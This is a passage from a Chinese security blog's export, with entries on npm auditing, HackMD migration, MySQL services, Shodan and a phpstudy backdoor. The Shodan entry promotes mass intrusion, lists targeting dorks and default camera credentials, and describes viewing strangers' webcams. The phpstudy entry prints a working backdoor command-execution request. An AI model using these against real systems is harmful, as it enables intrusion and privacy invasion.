class="string">'sindresorhus.com'</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(response.body);</span><br><span class="line">        <span class="comment">//=&gt; '&lt;!doctype html&gt; ...'</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(error.response.body);</span><br><span class="line">        <span class="comment">//=&gt; 'Internal server error ...'</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>使用该库比request库的代码更复杂，但是它只具有11个依赖项（总共24个）<br><img src="2.png" alt></p><h2 id="漏洞的管理"><a href="#漏洞的管理" class="headerlink" title="漏洞的管理"></a>漏洞的管理</h2><p>最佳的情况是，查看每个依赖项以了解整个软件所包含的内容。 但现实是，根据导入的软件包数量，效率会极其低。 相反，我们可以利用Node附带的Node Package Manager（NPM）。 它可以审核所有软件包。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">npm install request got</span><br><span class="line">npm audit</span><br><span class="line"></span><br><span class="line">                       === npm audit security report ===</span><br><span class="line"></span><br><span class="line">found 0 vulnerabilities</span><br><span class="line"> in 100 scanned packages</span><br></pre></td></tr></table></figure><p>之后，可能要考虑对软件包进行定期审核。</p><h2 id="看看-Serverless-Framework-的依赖关系"><a href="#看看-Serverless-Framework-的依赖关系" class="headerlink" title="看看 Serverless Framework 的依赖关系"></a>看看 Serverless Framework 的依赖关系</h2><p><img src="3.png" alt></p><p>如上图，无服务器软件包具有40个依赖关系，总共需要355个软件包。那么我受攻击的面就提高为355倍，gg…<br>所以定期更新无服务器软件包是必然的。 </p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>在编写无服务器应用程序时，最好检查一下导入的软件包、依赖关系树和已知漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Serverless </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速将hackmd中的笔记迁移到博客</title>
      <link href="/passages/2019-11-28-%E5%BF%AB%E9%80%9F%E5%B0%86hackmd%E4%B8%AD%E7%9A%84%E7%AC%94%E8%AE%B0%E8%BF%81%E7%A7%BB%E5%88%B0%E5%8D%9A%E5%AE%A2/"/>
      <url>/passages/2019-11-28-%E5%BF%AB%E9%80%9F%E5%B0%86hackmd%E4%B8%AD%E7%9A%84%E7%AC%94%E8%AE%B0%E8%BF%81%E7%A7%BB%E5%88%B0%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>平时记笔记会用hackmd，有时会用codimd（原因你懂的）<br>将笔记迁移到博客最大的问题就是图片</p></blockquote><a id="more"></a><h2 id="快速下载某个页面中的图片"><a href="#快速下载某个页面中的图片" class="headerlink" title="快速下载某个页面中的图片"></a>快速下载某个页面中的图片</h2><p>一开始准备直接将hackmd中的md文本直接复制过去，但是奈何图片资源是放在外网上面的。。</p><p>于是想着将所有图片资源下载下来，存放在博客服务器上。</p><h3 id="F12下的图片"><a href="#F12下的图片" class="headerlink" title="F12下的图片"></a>F12下的图片</h3><p>访问hackmd的某一篇文章：</p><p><img src="Snipaste_2019-11-28_17-18-16.png" alt></p><p>F12看下图片资源，同时过滤url：</p><p><img src="Snipaste_2019-11-28_17-25-30.png" alt></p><p>只能单个图片进行下载，不能选择全部再下载。。。苦辽</p><h2 id="Firefox-Image-Picka插件"><a href="#Firefox-Image-Picka插件" class="headerlink" title="Firefox + Image Picka插件"></a>Firefox + Image Picka插件</h2><p>一开始并没有使用这个插件，想着写个python脚本爬一下目标url中的图片资源。但是用python进行request请求的时候还要挂socket5代理，索性放弃。</p><p>后来找着了火狐浏览器下的一个插件，可以快速下载某个网页中出现的图片。</p><p><img src="Snipaste_2019-11-28_18-50-30.png" alt></p><p>如下图，在需要下载图片的网页打开插件，过滤一下图片的来源url，设置保存的文件名（为原文件名）</p><p><img src="Snipaste_2019-11-28_18-53-15.png" alt></p><p>如此，我就把需要的图片资源快速下载下来了：</p><p><img src="Snipaste_2019-11-28_18-53-46.png" alt></p><h2 id="使用文本编辑器删除一些字段"><a href="#使用文本编辑器删除一些字段" class="headerlink" title="使用文本编辑器删除一些字段"></a>使用文本编辑器删除一些字段</h2><p>我是使用sublime对粘贴好的md文件进行替换，将<code>https://i.imgur.com/</code>替换为<code>空</code>即可：</p><p><img src="Snipaste_2019-11-28_19-02-05.png" alt></p><p>至此，就已经改好了一篇markdown文件了（也就两步：<code>复制粘贴</code>、<code>替换</code>）</p><h2 id="Next-to-Do"><a href="#Next-to-Do" class="headerlink" title="Next to Do"></a>Next to Do</h2><p>实验室主页中的文章（校赛wp等），是东海学长直接从hackmd复制粘贴过来的（hackmd编辑感觉超好！），不采取点手段就别想看到图片了。。</p><p>抽个时间把图片全部放到主页所在的服务器上，再把文章修改一下即可~</p>]]></content>
      
      
      <categories>
          
          <category> 随笔笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hackmd笔记 </tag>
            
            <tag> 笔记迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shodan系统学习笔记</title>
      <link href="/passages/2019-11-24-Shodan%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/passages/2019-11-24-Shodan%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>很早就见识过Shodan的威力<br>这篇文章就系统总结一下Shodan的使用</p></blockquote><a id="more"></a><p>昨天Shodan十周年庆，当天购买永久会员只要1刀！<br>祝Shodan越做越好！</p><h2 id="Shodan是什么"><a href="#Shodan是什么" class="headerlink" title="Shodan是什么"></a>Shodan是什么</h2><blockquote><p>是一款特殊的<strong>搜索引擎</strong>，并不只单单针对Web中的各类html数据进行爬取。Shodan 是基于<strong>各类在线网络设备的banner</strong>进行全网搜索。<br>其中 Shodan 上最受欢迎的搜索内容是：webcam，linksys，cisco，netgear，SCADA等等。</p></blockquote><h2 id="我们可以利用Shodan来干什么"><a href="#我们可以利用Shodan来干什么" class="headerlink" title="我们可以利用Shodan来干什么"></a>我们可以利用Shodan来干什么</h2><blockquote><ol><li>利用 0day 实施大规模批量入侵，<strong>前提是不要把自己的0day撞到别人的蜜罐里面去了,否则就可惜了</strong></li><li><strong>全网批量统计</strong>所有感染有某一数据特征的后门，可以专门用来检测某种定向攻击</li><li><strong>批量扫描</strong>各种中间件的高危错误配置及能被远程利用的各类已知漏洞，也就是说完全可以把它当成一个高级的漏洞扫描器来用</li><li>批量探测各种<strong>弱口令</strong></li><li>批量<strong>抓各种shell</strong> [ 不仅限于webshell，backdoor]等等……</li></ol></blockquote><h2 id="Shodan-语法"><a href="#Shodan-语法" class="headerlink" title="Shodan 语法"></a>Shodan 语法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">city：   城市，只支持英文，而且不是能是简称。如TOKYO,Hong Kong,Seoul...</span><br><span class="line">country：  指定国家或地区后缀，比如:cn,us,jp,tw,br,ph,vn,hk...</span><br><span class="line">hostname： 指定主机名，其实就是目标域名[域名如果是子域还需要在前面加个.]</span><br><span class="line">net：      指定网络范围，可以是单个ip或者cidr格式的ip段</span><br><span class="line">os：   指定操作系统 centOS,win32,red hat,suse 等...</span><br><span class="line">port：  指定端口，HTTP (80),FTP (21),SSH (22),SNMP (161),SIP (5060)等...</span><br><span class="line">product：  指定具体的产品名称,如,各类操作系统/软件/平台/web服务器,数据库服务器,网络设备名称等...</span><br><span class="line">org：       搜索指定的组织或公司，例如 org:&quot;google&quot;</span><br><span class="line">isp：       搜索指定的ISP供应商，例如 isp:&quot;China Telecom&quot;</span><br><span class="line">version：   搜索指定的软件版本，例如 version:&quot;1.6.2&quot;</span><br><span class="line">geo：       搜索指定的地理位置，参数为经纬度，例如 geo:&quot;31.8639, 117.2808&quot;</span><br><span class="line">before/after：搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:&quot;11-11-15&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="Shodan官网界面介绍"><a href="#Shodan官网界面介绍" class="headerlink" title="Shodan官网界面介绍"></a>Shodan官网界面介绍</h2><p>比如我搜索“SSH”：</p><p><img src="1.png" alt><br><img src="2.png" alt></p><p><strong>左侧</strong>是大量的汇总数据包括：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Results map – 搜索结果展示地图</span><br><span class="line">Top services (Ports) – 使用最多的服务/端口</span><br><span class="line">Top organizations (ISPs) – 使用最多的组织/ISP</span><br><span class="line">Top operating systems – 使用最多的操作系统</span><br><span class="line">Top products (Software name) – 使用最多的产品/软件名称</span><br></pre></td></tr></table></figure></p><p><strong>中间</strong>的主页面我们可以看到包含如下的搜索结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IP 地址</span><br><span class="line">主机名</span><br><span class="line">ISP</span><br><span class="line">该条目的收录收录时间</span><br><span class="line">该主机位于的国家</span><br><span class="line">Banner 信息</span><br></pre></td></tr></table></figure></p><p>想要了解每个条目的具体信息，只需要点击每个IP。此时，URL 会变成这种格式<code>https://www.shodan.io/host/[IP]</code>，所以我们也可以通过直接访问指定的 IP 来查看详细信息。</p><p><img src="3.png" alt></p><p>上图中我们可以从<strong>顶部</strong>在地图中看到主机的物理地址，从<strong>左侧</strong>了解到主机的相关信息，<strong>右侧</strong>则包含目标主机的端口列表及其详细信息。</p><h2 id="一些简单的搜索实例"><a href="#一些简单的搜索实例" class="headerlink" title="一些简单的搜索实例"></a>一些简单的搜索实例</h2><hr><p>搜集某个城市的特定设备 [这里暂以不同类型的web服务器为例] 标识 [自己可以事先多收集一些常见的软件和设备标识]:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Microsoft-IIS/5.0 city:&quot;TOKYO&quot;   可逐个尝试能否直接写shell</span><br><span class="line">Microsoft-IIS/6.0 city:&quot;Seoul&quot; 可逐个尝试能否直接 RCE</span><br><span class="line">Microsoft-IIS/7.5 city:&quot;Hong Kong&quot; </span><br><span class="line">apache city:&quot;Nagoya&quot; </span><br><span class="line">Apache/2.2.27 city:&quot;Nagoya&quot;</span><br><span class="line">Tomcat city:&quot;Seoul&quot;可逐个尝试能否直接 RCE</span><br><span class="line">cisco city:&quot;Osaka&quot;</span><br><span class="line">tplink city:&quot;nanjing&quot;</span><br></pre></td></tr></table></figure></p><hr><p>搜索特定版本的操作系统及端口:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">os:&quot;linux&quot; net:&quot;72.34.62.0/24&quot;</span><br><span class="line">os:&quot;windows&quot; net:&quot;195.40.91.0/24&quot;</span><br><span class="line">Apache city:&quot;Hong Kong&quot; port:&quot;8080&quot;  product:&quot;Apache Tomcat/Coyote JSP engine&quot;</span><br><span class="line">Apache city:&quot;Seoul&quot; port:&quot;8080&quot;</span><br><span class="line">hostname:&quot;.polyu.edu.hk&quot; os:&quot;windows&quot;</span><br></pre></td></tr></table></figure></p><hr><p>搜索指定国家地域特定类型的工具服务 (还是那句话,多搜集一些高质量的工具banner):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">product:&quot;tomcat&quot;  net:&quot;158.132.18.0/24&quot;</span><br><span class="line">product:&quot;apache&quot;  net:&quot;158.132.18.0/24&quot;</span><br><span class="line">product:&quot;iis&quot;     net:&quot;158.132.18.0/24&quot;</span><br><span class="line">port:&quot;8080&quot; jboss country:CN</span><br><span class="line">port:&quot;8080&quot; jboss country:IN</span><br></pre></td></tr></table></figure></p><hr><p>扫描指定网段内的所有特定数据库服务器:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">product:&quot;Mysql&quot;  net:&quot;140.117.13.0/24&quot; port:&quot;3306&quot;</span><br><span class="line">port:&quot;1433&quot; net:&quot;78.131.197.0/24&quot;</span><br><span class="line">port:&quot;5432&quot; net:&quot;77.55.149.0/24&quot;</span><br><span class="line">port:&quot;1521&quot; net:&quot;78.143.192.0/12&quot;</span><br><span class="line">port:&quot;1521&quot; city:&quot;Osaka&quot;</span><br></pre></td></tr></table></figure></p><hr><p>搜索特定远程管理终端端口:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">os:&quot;windows&quot; port:&quot;3389&quot; net:&quot;107.160.1.0/24&quot;</span><br><span class="line">os:&quot;linux&quot; port:&quot;22&quot; net:&quot;107.160.1.0/24&quot;</span><br><span class="line">os:&quot;linux&quot; port:&quot;23&quot; net:&quot;107.160.1.0/24&quot;</span><br><span class="line">os:&quot;linux&quot; port:&quot;23&quot; net:&quot;87.124.0.0/15&quot;</span><br></pre></td></tr></table></figure></p><hr><p>搜索ftp / tftp :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">port:&quot;21&quot; net:&quot;107.160.1.0/24&quot;</span><br><span class="line">port:&quot;69&quot; net:&quot;218.242.16.0/24&quot;</span><br></pre></td></tr></table></figure></p><hr><p>在某个城市中搜索指定的端口,操作系统及在线网络设备:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">city:&quot;Hong Kong&quot; port:&quot;69&quot;</span><br><span class="line">city:&quot;Hong Kong&quot; port:&quot;3389&quot;</span><br><span class="line">city:&quot;Hong Kong&quot; port:&quot;22&quot;</span><br><span class="line">city:&quot;Hong Kong&quot; port:&quot;23&quot;</span><br><span class="line">city:&quot;Hong Kong&quot; port:&quot;3306&quot;</span><br><span class="line">city:&quot;Hong Kong&quot; port:&quot;110&quot;</span><br><span class="line">city:&quot;Hong Kong&quot; os:&quot;windows&quot;</span><br><span class="line">city:&quot;Hong Kong&quot; product:&quot;cisco&quot;</span><br><span class="line">city:&quot;Hong Kong&quot; port:&quot;8080&quot;</span><br></pre></td></tr></table></figure></p><hr><p>搜索指定国家的特定设备,端口,服务器:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">port:&quot;23&quot; country:CN</span><br><span class="line">port:&quot;1433&quot; country:CN</span><br><span class="line">port:&quot;3389&quot; country:CN</span><br><span class="line">tplink country:CN</span><br><span class="line">huawei country:CN</span><br><span class="line">netcam  country:CN</span><br><span class="line">country:CN net:&quot;115.225.113.0/24&quot; port:&quot;22&quot;</span><br><span class="line">country:CN router</span><br><span class="line">admin login  country:HK</span><br><span class="line">hacked by country:HK</span><br></pre></td></tr></table></figure></p><hr><p>搜缺省密码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;default password&quot; city:&quot;Hong Kong&quot;</span><br><span class="line">country:CN &quot;default password&quot;</span><br></pre></td></tr></table></figure></p><hr><p>搜索各类漏洞摄像头:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netcam net:&quot;187.189.82.0/24&quot;</span><br></pre></td></tr></table></figure></p><h2 id="常见设备的默认用户名密码，可以尝试撞撞运气"><a href="#常见设备的默认用户名密码，可以尝试撞撞运气" class="headerlink" title="常见设备的默认用户名密码，可以尝试撞撞运气"></a>常见设备的默认用户名密码，可以尝试撞撞运气</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ACTi: admin/123456 or Admin/123456</span><br><span class="line">Axis (traditional): root/pass,</span><br><span class="line">Axis (new): requires password creation during first login</span><br><span class="line">Cisco: No default password, requires creation during first login</span><br><span class="line">Grandstream: admin/admin</span><br><span class="line">IQinVision: root/system</span><br><span class="line">Mobotix: admin/meinsm</span><br><span class="line">Panasonic: admin/12345</span><br><span class="line">Samsung Electronics: root/root or admin/4321</span><br><span class="line">Samsung Techwin (old): admin/1111111</span><br><span class="line">Samsung Techwin (new): admin/4321</span><br><span class="line">Sony: admin/admin</span><br><span class="line">TRENDnet: admin/admin</span><br><span class="line">Toshiba: root/ikwd</span><br><span class="line">Vivotek: root/&lt;blank&gt;</span><br><span class="line">WebcamXP: admin/ &lt;blank&gt;</span><br></pre></td></tr></table></figure><h2 id="别人的一点小结"><a href="#别人的一点小结" class="headerlink" title="别人的一点小结"></a>别人的一点小结</h2><ul><li><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a>   知道创宇的钟馗之眼，基于shodan实现</li><li>完全手工的话,确实挺累的,为什么不写成<strong>自动化的脚本</strong>来帮我们完成呢。很多现成的优秀脚本是我们学习的来源</li><li>在写脚本之前,自己首先要能熟练使用才是,这样写出来的工具杀伤力才能更大些</li><li>用这些搜索引擎的时候,最好全程挂上vpn,<strong>推荐美国的</strong>,原因大家应该都明白,自家人对自家人的限制几乎是最少的</li></ul><h2 id="利用MSF-Shadon搜索网络摄像头"><a href="#利用MSF-Shadon搜索网络摄像头" class="headerlink" title="利用MSF+Shadon搜索网络摄像头"></a>利用MSF+Shadon搜索网络摄像头</h2><p>看到一个好玩的，玩一下。</p><p>MSF我一直很喜欢~</p><p><code>auxiliary/gather/shodan_search</code>模块：</p><p><img src="4.png" alt></p><p><code>SHODAN_APIKEY</code>从官网看；<br><code>QUERY</code>查询的设备为<code>webcamxp</code></p><p>运行：<br><img src="5.png" alt></p><p>随便点几个看看：</p><p><img src="6.png" alt><br>大叔肚子有点大啊。。</p><p><img src="7.png" alt><br>貌似监控某个设备</p><p><img src="8.png" alt><br>实验室的设备？？</p><p><img src="9.png" alt><br>嘿嘿，居住区了</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.iyunv.com/thread-392144-1-1.html" target="_blank" rel="noopener">https://www.iyunv.com/thread-392144-1-1.html</a></p><p><a href="https://klionsec.github.io/2014/12/15/shodan-hacking/" target="_blank" rel="noopener">熟练利用 shodan hacking 辅助我们快速渗透[ 大中型目标 ]</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MjMwNDYxNw==&amp;mid=2247483657&amp;idx=1&amp;sn=f9de9948f4255ecea6f75f7060418a4a&amp;chksm=fe20818fc9570899cd7fa0eb24e90db5c7a3cdbcee69ffef589c3c7e76e7c99be0c708ed5115&amp;mpshare=1&amp;scene=23&amp;srcid=1118FG5Hd7otDeHSb4c6j8LP&amp;sharer_sharetime=1574008055044&amp;sharer_shareid=3291101a2a6d966b2b8feb2b3fde94bf#rd" target="_blank" rel="noopener">利用MSF+Shadon搜索网络摄像头</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shodan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpstudy后门分析与复现</title>
      <link href="/passages/phpstudy%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>/passages/phpstudy%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我号没了</p></blockquote><a id="more"></a><h2 id="phpstudy简介"><a href="#phpstudy简介" class="headerlink" title="phpstudy简介"></a>phpstudy简介</h2><p>phpStudy是一个PHP调试环境的程序集成包。该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer，一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境。该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等。</p><p><strong>威胁等级</strong>：<font color="red">严重</font><br><strong>影响范围</strong>：phpstudy2016版、2018版<br><strong>后门类型</strong>：C&amp;C、命令执行<br><strong>利用难度</strong>：极易</p><p>目前已知受影响的phpstudy版本：</p><ul><li>phpstudy 2016版php-5.4</li><li>phpstudy 2018版php-5.2.17</li><li>phpstudy 2018版php-5.4.45</li></ul><h2 id="后门模块分析"><a href="#后门模块分析" class="headerlink" title="后门模块分析"></a>后门模块分析</h2><p>含后门的模块位置：<code>\ext\php_xmlrpc.dll</code>，至少在两个版本中存在该后门。<br><img src="./Snipaste_2019-09-25_09-51-44.png" alt></p><p>快速判断该模块中是否存在后门方法：<code>记事本打开该.dll文件，搜索eval字符串</code>，显示如下结果：<br><img src="./Snipaste_2019-09-25_09-54-23.png" alt></p><p>后门包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">accept-charset: c3lzdGVtKCd3aG9hbWknKTs=/*这里就是要执行的命令base64加密*/</span><br><span class="line">Connection: close</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>开启我的phpstudy<br>哦豁，火绒是真的nb，病毒库更新这么迅速<br><img src="./火绒病毒库1.png" alt><br><img src="./火绒病毒库2.png" alt></p><p>但火绒未免也太小气了，病毒竟然命名为<code>FakeStudy</code><br>phpstudy用的还是很舒服的。</p><p>添加一下<code>信任区</code>，继续我的复现之旅。</p><p>发个包过去瞅瞅：<br><img src="./Snipaste_2019-09-25_10-25-42.png" alt><br>哦豁，完蛋，我号没了:(<br><img src="./http___img04_sogoucdn_com_app_a_200678_e185e822b3.jpg" alt></p><h2 id="自动化利用"><a href="#自动化利用" class="headerlink" title="自动化利用"></a>自动化利用</h2><p>上面那样利用还是不够爽，<del>写个python自动化脚本吧</del>！<br>批量利用脚本链接：<a href="https://www.cnblogs.com/-qing-/p/11575622.html" target="_blank" rel="noopener">https://www.cnblogs.com/-qing-/p/11575622.html</a></p><p>脚本演示：<br><img src="./Snipaste_2019-09-25_10-30-36.png" alt><br>工具一把梭就是舒服，脚本小子实锤了。</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ul><li>删除存在后门的模块</li><li>更新phpstudy到最新的2019版本</li><li><del>卸载phpstudy</del></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpstudy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对本地三个MySQL数据库进行管理</title>
      <link href="/passages/2019-6-12-%E5%AF%B9%E6%9C%AC%E5%9C%B0%E4%B8%89%E4%B8%AAMySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9B%E8%A1%8C%E7%AE%A1%E7%90%86/"/>
      <url>/passages/2019-6-12-%E5%AF%B9%E6%9C%AC%E5%9C%B0%E4%B8%89%E4%B8%AAMySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9B%E8%A1%8C%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<blockquote><p>三个数据库：</p><ul><li>本地安装</li><li>wamp</li><li>phpstudy（最近为了看乌云漏洞库才安装，也发现了一大堆问题）</li></ul></blockquote><a id="more"></a><h2 id="安装的独立MySQL"><a href="#安装的独立MySQL" class="headerlink" title="安装的独立MySQL"></a>安装的独立MySQL</h2><p>之前学习MySQL时还没有安装集成环境，用得也挺舒服的。<br>安装好后会在系统服务中添加MySQL服务，开启命令：<code>net start mysql</code>，但现在对我来说已经没用了。<br>bin目录下的 <code>mysqld-nt.exe</code> 也就是启动MySQL服务用的。</p><h2 id="wamp的MySQL"><a href="#wamp的MySQL" class="headerlink" title="wamp的MySQL"></a>wamp的MySQL</h2><p>wamp也还可以，就是版本太少了，迫不得已转战phpstudy。<br>当时安装好wamp后，也没遇到什么大问题，只是有时候系统的MySQL服务没关，导致连接不上，关掉即可（命令关闭或者服务中关闭）。</p><h2 id="phpstudy的MySQL"><a href="#phpstudy的MySQL" class="headerlink" title="phpstudy的MySQL"></a>phpstudy的MySQL</h2><p>安装好后就是不能启动MySQL服务，查询资料解释如下：</p><blockquote><p>可能是之前已经装过Mysql，要把系统服务里面的MySQL删除，留下MySQLa服务。<br>在cmd命令行下输入：<code>sc delete mysql</code> 即可删除。</p></blockquote><p>的确，这样就能够启动phpstudy自带的MySQL服务了。但是原先系统安装的MySQL服务给删除了，不方便一键启动了，毕竟做项目啥的数据库文件还是喜欢放在本地第一次安装的MySQL中，因为扩展多，支持的功能多（<del>我也没有项目可做！</del>）。</p><h2 id="分别启动三个MySQL服务"><a href="#分别启动三个MySQL服务" class="headerlink" title="分别启动三个MySQL服务"></a>分别启动三个MySQL服务</h2><p>首先，命令行下输入 <code>mysql -uroot -p</code> 就可以连接一个本地的MySQL服务。</p><h3 id="连接wamp的MySQL"><a href="#连接wamp的MySQL" class="headerlink" title="连接wamp的MySQL"></a>连接wamp的MySQL</h3><p>首先打开任务管理器，看一下其他的MySQL服务是不是还在运行，一般是在详细信息中显示 <code>mysqld.exe</code> 或者 <code>mysqld-nt.exe</code> 。<br>确保没有其他正在运行就直接打开wamp，它就会运行MySQL服务，直接命令行下 <code>mysql -uroot -p</code> 就可连接。<br><strong>记住退出wamp之前将所有服务先关闭。</strong></p><h3 id="连接phpstudy的MySQL服务"><a href="#连接phpstudy的MySQL服务" class="headerlink" title="连接phpstudy的MySQL服务"></a>连接phpstudy的MySQL服务</h3><p>同样先查看有没有其他MySQL服务正在运行。还有就是得删除原先系统安装的MySQL服务。<br>运行phpstudy后就命令行下连接MySQL。<br><strong>记住退出phpstudy之前将所有服务先关闭。</strong></p><h3 id="连接系统安装的MySQL服务"><a href="#连接系统安装的MySQL服务" class="headerlink" title="连接系统安装的MySQL服务"></a>连接系统安装的MySQL服务</h3><p>首先确保没有其他MySQL服务在运行，有的话直接kill。<br>然后找到 <code>bin</code> 目录下的 <code>mysql-nt.exe</code> ，双击运行。命令行下运行也可，但是会占用当前命令行。</p><p><img src="./1.png" alt></p><p>命令连接MySQL服务即可。</p><p>同样，记得关闭这个服务，直接在任务管理器中暴力kill。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS练习笔记</title>
      <link href="/passages/2019-03-25-XSS%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/passages/2019-03-25-XSS%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
